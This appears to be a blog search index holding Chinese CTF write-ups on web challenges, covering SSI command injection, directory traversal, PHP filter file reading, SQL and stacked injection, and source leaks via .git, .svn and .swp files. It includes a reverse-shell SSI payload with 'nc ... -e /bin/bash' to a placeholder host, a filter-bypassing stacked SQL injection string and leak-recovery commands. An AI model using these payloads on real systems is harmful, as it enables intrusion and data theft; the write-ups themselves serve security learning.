@@ -1,0 +1,259 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>BDJCTF-2020-Web-easy_search</title>
+      <link href="/blog/2021/01/24/bdjctf-2020-web-easy-search/"/>
+      <url>/blog/2021/01/24/bdjctf-2020-web-easy-search/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BDJCTF-2020-Web-easy-search"><a href="#BDJCTF-2020-Web-easy-search" class="headerlink" title="BDJCTF-2020-Web-easy_search"></a>BDJCTF-2020-Web-easy_search</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/01/24/e4Y2fancQwthXLF.png" alt="1.png"></p><p>首先还是常规操作先丢进dirsearch里扫着</p><p>咱也不闲着，看到登录功能点尝试注入、弱口令。f12找线索</p><p>然而完全摸不到思路，回去看dirsearch发现swp泄露</p><p><img src="https://i.loli.net/2021/01/24/OawUBu4E25H6jI3.png" alt="2.png"></p><p>尝试直接访问</p><p><img src="https://i.loli.net/2021/01/24/VxdkJe56ElI2WMm.png" alt="3.png"></p><p>好家伙，都不用工具进行恢复，直接就显示出来源码的</p><p>大概读了一下，只判断了密码经md5加密后的前六位等于”6d0bc1”即可</p><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p>网上随便找了个脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/01/24/45SLFDHPmedaNxu.png" alt="4.png"></p><p>跑出结果</p><pre><code>20206666d0bc1153791aa2b4e18b4f344f26ab423050046d0bc1ec71a9b814677b85e3ac9c3d4091626716d0bc11ea877b37d694b38ba8a45b19c</code></pre><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>随便用一个跑出的密码登录后会创建一个shtml文件，并将用户名输出到该shtml文件内</p><p><img src="https://i.loli.net/2021/01/24/lmAYgeUM8uCh5aH.png" alt="5.png"></p><p>访问该文件</p><p><img src="https://i.loli.net/2021/01/24/mVfZw4xN2DgOuTv.png" alt="6.png"></p><p>等等，shtml文件？可控参数带入shtml文件？ssi命令执行？？？</p><h2 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h2><p>查了相关资料后得知</p><p>SSI是在HTML文件中，通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><p>尝试在用户名参数处执行命令反弹shell</p><p><code>&lt;!--#exec cmd=&quot;nc x.x.x.x 8888 -e /bin/bash&quot;--&gt;</code></p><p>并没有接收到shell</p><p>哎，老老实实直接执行命令拿flag吧</p><p>经过一番尝试，发现flag在当前目录的上一级，将用户名换为<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>，访问生成的文件</p><p><img src="https://i.loli.net/2021/01/24/LzNXVrY8Z7Slf5o.png" alt="8.png"></p><p>然后cat读文件即可</p><p><img src="https://i.loli.net/2021/01/24/WLqgsifxh4AMnV6.png" alt="10.png"></p><p><img src="https://i.loli.net/2021/01/24/e1giK5HIEaY92xr.png" alt="11.png"></p><p>ctfhub{db396423e0f56f1afb68c326}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> ctfhub刷题记录 </category>
+          
+          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ssi </tag>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>N1Book_afr_2</title>
+      <link href="/blog/2021/01/24/n1book-afr-2/"/>
+      <url>/blog/2021/01/24/n1book-afr-2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="N1Book-afr-2"><a href="#N1Book-afr-2" class="headerlink" title="N1Book_afr_2"></a>N1Book_afr_2</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/01/24/itMVWzYnFGwv2oa.png" alt="1.png"></p><p>尝试dirsearch一把梭后只扫到网站根目录下图片文件夹img</p><p>访问</p><p><img src="https://i.loli.net/2021/01/24/u6qs4fwK5AG1HDS.png" alt="4.png"></p><p>可以发现列出了img目录，题目描述中是任意文件读取</p><p>猜想存在目录穿越，尝试穿到上级目录</p><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>目录穿越漏洞一般是由nginx的错误配置导致的</p><p><img src="https://i.loli.net/2021/01/24/wk9JInHdDNRX4WP.png" alt="5.png"></p><p>嗯？可以看到flag文件？这就完了？</p><p>下载文件打开后……还真就完了</p><p>n1book{afr_2_solved}</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>修改/usr/local/nginx/conf/nginx.conf，使用/闭合/files,形成/files/；或删除/home/后面的斜杠</p><p>即，files和home右端要么都闭合要么都不闭合</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> ctfhub刷题记录 </category>
+          
+          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 目录穿越 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>N1Book_afr_1</title>
+      <link href="/blog/2021/01/24/n1book-afr-1/"/>
+      <url>/blog/2021/01/24/n1book-afr-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="N1Book-afr-1"><a href="#N1Book-afr-1" class="headerlink" title="N1Book_afr_1"></a>N1Book_afr_1</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/01/24/FZrgvR12zfyWDjI.png" alt="1.png"></p><p>参数p=hello根据经验猜测为文件包含点，包含的参数后应该拼接了.php。</p><h2 id="伪协议读源码"><a href="#伪协议读源码" class="headerlink" title="伪协议读源码"></a>伪协议读源码</h2><p>尝试直接替换hello为flag，发现过滤掉了</p><p><img src="https://i.loli.net/2021/01/24/m3p2lXuoxNbPqIJ.png" alt="2.png"></p><p>用filter读取</p><p><img src="https://i.loli.net/2021/01/24/3IeXNmjRo6lM7CZ.png" alt="3.png"></p><p>解码即可得flag</p><p><img src="https://i.loli.net/2021/01/24/Tf3m2ebQR6GpDlJ.png" alt="4.png"></p><p>n1book{afr_1_solved}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> ctfhub刷题记录 </category>
+          
+          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>N1Book_粗心的小李</title>
+      <link href="/blog/2021/01/24/n1book-cu-xin-de-xiao-li/"/>
+      <url>/blog/2021/01/24/n1book-cu-xin-de-xiao-li/</url>
+      
+        <content type="html"><![CDATA[<h1 id="N1Book-粗心的小李"><a href="#N1Book-粗心的小李" class="headerlink" title="N1Book_粗心的小李"></a>N1Book_粗心的小李</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/01/24/y2kiqX4EDeF5jxz.png" alt="1.png"></p><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>初始化仓库的时候生成的隐藏文件夹.git中保存了这个仓库的所有版本等信息</p><p>攻击者可利用这个文件夹恢复出网站目录甚至代码。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>利用工具有很多</p><ol><li>Githack：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li></ol><pre><code>GitHack.py http://example.com/.git/</code></pre><ol start="2"><li>githacker：<a href="https://github.com/wangyihang/GitHacker">https://github.com/wangyihang/GitHacker</a></li></ol><pre><code>Githack.py http://example.com/.git/</code></pre><ol start="3"><li>git_extract：<a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></li></ol><pre><code>git_extract.py http://example.com/.git/</code></pre><p>我用的是第三个工具git_extract</p><p><img src="https://i.loli.net/2021/01/24/IVegpqnhPwbJ3OZ.png" alt="2.png"></p><p>flag在恢复出的index.html中</p><p><img src="https://i.loli.net/2021/01/24/iChz2gJFoM6bpru.png" alt="3.png"></p><p>n1book{git_looks_s0_easyfun}</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>删除.git文件夹或对该文件夹进行权限控制</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> ctfhub刷题记录 </category>
+          
+          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 泄露 </tag>
+            
+            <tag> git泄露 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>N1Book_sql注入1</title>
+      <link href="/blog/2021/01/22/n1book-sql-zhu-ru-1/"/>
+      <url>/blog/2021/01/22/n1book-sql-zhu-ru-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="N1Book-sql注入1"><a href="#N1Book-sql注入1" class="headerlink" title="N1Book_sql注入1"></a>N1Book_sql注入1</h1><p>无过滤sql注入（字符型）没啥看的</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/01/22/14nfcmH8ZPFuV7C.png" alt="1.png"></p><h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><p>加’异常</p><p><img src="https://i.loli.net/2021/01/22/8kxSPYnJ153yFIq.png" alt="2.png"></p><p>加’–+恢复</p><p><img src="https://i.loli.net/2021/01/22/dYKZCzqVJvhB4Tx.png" alt="3.png"></p><p>基本判断为字符型注入点，参数由单引号包裹</p><h2 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h2><p><img src="https://i.loli.net/2021/01/22/Y9RZCqshV1k7Lei.png" alt="4.png"></p><p>字段数量为3</p><h2 id="判断可显字段"><a href="#判断可显字段" class="headerlink" title="判断可显字段"></a>判断可显字段</h2><p><img src="https://i.loli.net/2021/01/22/rOk6U71zMjfv8GX.png" alt="5.png"></p><p>可显字段数量为3</p><h2 id="查当前数据库"><a href="#查当前数据库" class="headerlink" title="查当前数据库"></a>查当前数据库</h2><p><img src="https://i.loli.net/2021/01/22/P5QMxjVeq2vIgFi.png" alt="6.png"></p><h2 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h2><p><img src="https://i.loli.net/2021/01/22/xc1OXzqGohjVRmB.png" alt="7.png"></p><h2 id="查fl4g表内字段"><a href="#查fl4g表内字段" class="headerlink" title="查fl4g表内字段"></a>查fl4g表内字段</h2><p><img src="https://i.loli.net/2021/01/22/eWktoEuUGy3naFY.png" alt="8.png"></p><h2 id="查flag"><a href="#查flag" class="headerlink" title="查flag"></a>查flag</h2><p><img src="https://i.loli.net/2021/01/22/gjVLX9JemRvWcNB.png" alt="9.png"></p><p>n1book{union_select_is_so_cool}</p><p>溜了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> ctfhub刷题记录 </category>
+          
+          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>N1Book_常见的搜集</title>
+      <link href="/blog/2021/01/21/n1book-chang-jian-de-sou-ji/"/>
+      <url>/blog/2021/01/21/n1book-chang-jian-de-sou-ji/</url>
+      
+        <content type="html"><![CDATA[<h1 id="N1Book-常见的搜集"><a href="#N1Book-常见的搜集" class="headerlink" title="N1Book_常见的搜集"></a>N1Book_常见的搜集</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://i.loli.net/2021/01/22/Yz3HkhAxy817COV.png" alt="1.png"></p><h2 id="第一部分flag"><a href="#第一部分flag" class="headerlink" title="第一部分flag"></a>第一部分flag</h2><p>看到敏感文件首先想到了robots.txt文件</p><p><img src="https://i.loli.net/2021/01/22/V5UwypBJ2beahKR.png" alt="2.png"></p><p>访问得到上图，继续访问所给txt文件</p><p><img src="https://i.loli.net/2021/01/22/kLZHCvpuFYQwjif.png" alt="3.png"></p><p>得到第一部分得flag，尝试了<a href="http://www.zip,www.rar,wwwroot.zip,wwwroot.zip后都不存在.也不想手动尝试了,直接上dirsearch跑出敏感文件/">www.zip,www.rar,wwwroot.zip,wwwroot.zip后都不存在。也不想手动尝试了，直接上dirsearch跑出敏感文件</a></p><p><img src="https://i.loli.net/2021/01/22/PsuNCFJwHRZzOeK.png" alt="6.png"></p><h2 id="第二部分flag"><a href="#第二部分flag" class="headerlink" title="第二部分flag"></a>第二部分flag</h2><p>访问index.php~即可得到第二部分flag</p><p><img src="https://i.loli.net/2021/01/22/Y7yL1IoRUGHzeQd.png" alt="7.png"></p><h2 id="第三部分flag"><a href="#第三部分flag" class="headerlink" title="第三部分flag"></a>第三部分flag</h2><p>发现存在swp文件，访问下载后用<code>vim -r index.php.swp</code>恢复文件即可得第三部分flag</p><p><img src="https://i.loli.net/2021/01/22/5f8MtPOpuxQgU73.png" alt="8.png"></p><p>然后拼接三部分flag即可</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> ctfhub刷题记录 </category>
+          
+          <category> 从0到1：CTFer成长之路》配套题目 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 泄露 </tag>
+            
+            <tag> 信息搜集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>强网杯2019_随便注</title>
+      <link href="/blog/2021/01/21/qiang-wang-bei-2019-sui-bian-zhu/"/>
+      <url>/blog/2021/01/21/qiang-wang-bei-2019-sui-bian-zhu/</url>
+      
+        <content type="html"><![CDATA[<h1 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="[强网杯2019]随便注"></a>[强网杯2019]随便注</h1><h2 id="确认注入"><a href="#确认注入" class="headerlink" title="确认注入"></a>确认注入</h2><p>在1后输入单双引号后发现双引号正常回显，单引号报错。</p><p>输入1’#回显恢复正常，基本确定存在sql注入问题</p><p>正常order by判断字段数量为2后进行联合注入</p><p><img src="https://i.loli.net/2021/01/21/vXBLT2lSE54xjwA.png" alt="1.png"></p><p>出现过滤规则，似乎常用的关键字都被过滤掉了</p><p>尝试进行堆叠注入查库</p><p><img src="https://i.loli.net/2021/01/21/H7PiJ9Gs1XOYh2N.png" alt="2.png"></p><p>查表</p><p><img src="https://i.loli.net/2021/01/21/peTVsIY4ClOPcja.png" alt="3.png"></p><p>查字段，有一个纯数字的有点可疑，注意表名为纯数字的要用反引号引起来</p><p><img src="https://i.loli.net/2021/01/21/4IebMpKV1sBiQJt.png" alt="4.png"></p><p>可以发现flag字段</p><h2 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h2><p>mysql中的预处理语句</p><ol><li>preare：使一个名字等于一条sql语句</li><li>execute：执行语句</li><li>deallocate prepare：释放语句</li></ol><p>本题中想要查询到flag可以进行如下构造</p><pre><code>set @Lucifer=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);prepare inject from @Luciferexecute inject;</code></pre><p>然后发现set和prepare被过滤掉  但使用strstr方法过滤的  尝试大写绕过</p><pre><code>1&#39;;Set @Lucifer=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);Prepare inject from @Lucifer;execute inject; #</code></pre><p><img src="https://i.loli.net/2021/01/21/Rgh83ECnwoXd54j.png" alt="5.png"></p><p>flag到手。溜了溜了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+          <category> 刷题记录 </category>
+          
+          <category> buu刷题记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buu刷题记录 </tag>
+            
+            <tag> sql注入 </tag>
+            
+            <tag> 堆叠注入 </tag>
+            
+            <tag> sql预处理语句 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>泄露问题总结</title>
+      <link href="/blog/2021/01/20/xie-lu-wen-ti-zong-jie/"/>
+      <url>/blog/2021/01/20/xie-lu-wen-ti-zong-jie/</url>
+      
+        <content type="html"><![CDATA[<h1 id="web中的泄露问题总结"><a href="#web中的泄露问题总结" class="headerlink" title="web中的泄露问题总结"></a>web中的泄露问题总结</h1><h2 id="网站备份"><a href="#网站备份" class="headerlink" title="网站备份"></a>网站备份</h2><p>该漏洞主要是运维人员的安全意识不到位造成的。运维人员通过在代码执行目录下备份重要的文件，这会导致用户可以直接下载到该文件。如xxx.zip，xxx.tgz，xxx.rar等</p><hr><h2 id="WEB-INF-web-xml信息泄露"><a href="#WEB-INF-web-xml信息泄露" class="headerlink" title="WEB-INF/web.xml信息泄露"></a>WEB-INF/web.xml信息泄露</h2><p>它的原理与phpinfo相似，都是通过该页面，泄露出网站的一些重要信息。如果存在该信息泄露的漏洞，必须通过禁止访问的方式来防范。</p><hr><h2 id="hg-bzr文件泄露"><a href="#hg-bzr文件泄露" class="headerlink" title=".hg  .bzr文件泄露"></a>.hg  .bzr文件泄露</h2><p>.hg文件：一个版本控制系统的隐藏文件，跟svn和git一样。    </p><p>.bzr文件：一个版本控制系统的隐藏文件，跟svn和git一样。</p><hr><h2 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title="DS_Store泄露"></a>DS_Store泄露</h2><p>该文件为苹果电脑的隐藏文件，这只会在苹果电脑才会存在。该文件上传后，可能会造成文件目录结构泄露，特别是备份文件，源代码文件。    </p><p>漏洞利用的工具：<a href="https://github.com/lijiejie/ds_store_exp%EF%BC%8C%E4%BD%BF%E7%94%A8%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%AF%B9%E4%B8%8A%E9%9D%A2%E7%9A%84%E7%9B%AE%E5%BD%95%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%E3%80%82">https://github.com/lijiejie/ds_store_exp，使用这个工具，就可以对上面的目录进行利用。</a></p><p>主要的防护方法就是将给文件给删除掉。<br>sudo find / -name “.DS_Store” -depth -exec rm {} ;</p><hr><h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p>漏洞成因：将代码部署的时候，没有将.svn版本控制的目录进行删除。这时，用户可以使用这个目录下的文件，来恢复源码。从而可以获取如数据库密码，源码漏洞等信息。    </p><p>漏洞利用的方式：</p><ul><li><p>1</p><pre><code>wget -r --no-parent --mirror http://www.example.com/.svn    cd www.example.com &amp;&amp; svn revert --recursive .</code></pre></li></ul><ul><li><p>2</p><p><a href="https://github.com/kost/dvcs-ripper%E7%9A%84%E8%84%9A%E6%9C%AC">https://github.com/kost/dvcs-ripper的脚本</a>    </p><p>使用下面的命令：<code>rip-svn.pl -v -u http://yourdomain/.svn/</code>就可以恢复出代码来。</p></li><li><p>3</p><p>Seay-SVN工具</p></li></ul><hr><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>原因： 代码部署的时候，没有将.git版本控制的目录进行删除。这时，用户可以使用这个目录下的文件，来恢复源码。从而可以获取如数据库密码，源码漏洞等信息    </p><p>利用：使用githack工具    </p><p><code>GitHack.py http://www.openssl.org/.git/python GitHack.py http://yoururl/.git/</code></p><p>jgithack工具</p><hr><h2 id="swp泄露"><a href="#swp泄露" class="headerlink" title="swp泄露"></a>swp泄露</h2><p>原因：swp文件是在使用vim/vi工具进行修改并异常退出的时候产生的文件    </p><p>利用：下载swp文件到本地 使用<code>vim -r filename.swp</code>即可恢复文件内容</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 泄露 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
